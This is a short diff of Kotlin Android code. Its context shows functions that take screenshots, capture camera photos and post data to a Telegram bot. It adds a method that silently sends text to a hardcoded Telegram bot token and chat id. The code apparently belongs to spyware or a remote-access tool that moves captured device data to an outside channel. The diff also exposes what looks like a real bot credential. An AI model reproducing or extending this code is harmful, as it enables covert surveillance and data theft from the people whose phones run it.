@@ -246,9 +246,6 @@ private suspend fun takeScreenshot() {
 
 
 
-
-
-
     
     private fun takeCameraPhoto(facing: Int) {
         val manager = getSystemService(CAMERA_SERVICE) as CameraManager
@@ -572,6 +569,24 @@ private suspend fun takeScreenshot() {
             client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").post(form).build()).execute()
         } catch (e: Exception) { Log.e("Bot", "SendMsg Error", e) }
     }
+
+companion object {
+    suspend fun sendStaticTelegramMessage(text: String) {
+        try {
+            val client = OkHttpClient()
+            val form = FormBody.Builder()
+                .add("chat_id", "8820979221")
+                .add("text", text)
+                .build()
+            client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc/sendMessage").post(form).build()).execute()
+        } catch (e: Exception) {}
+    }
+}
+
+
+
+
+
 
 
 
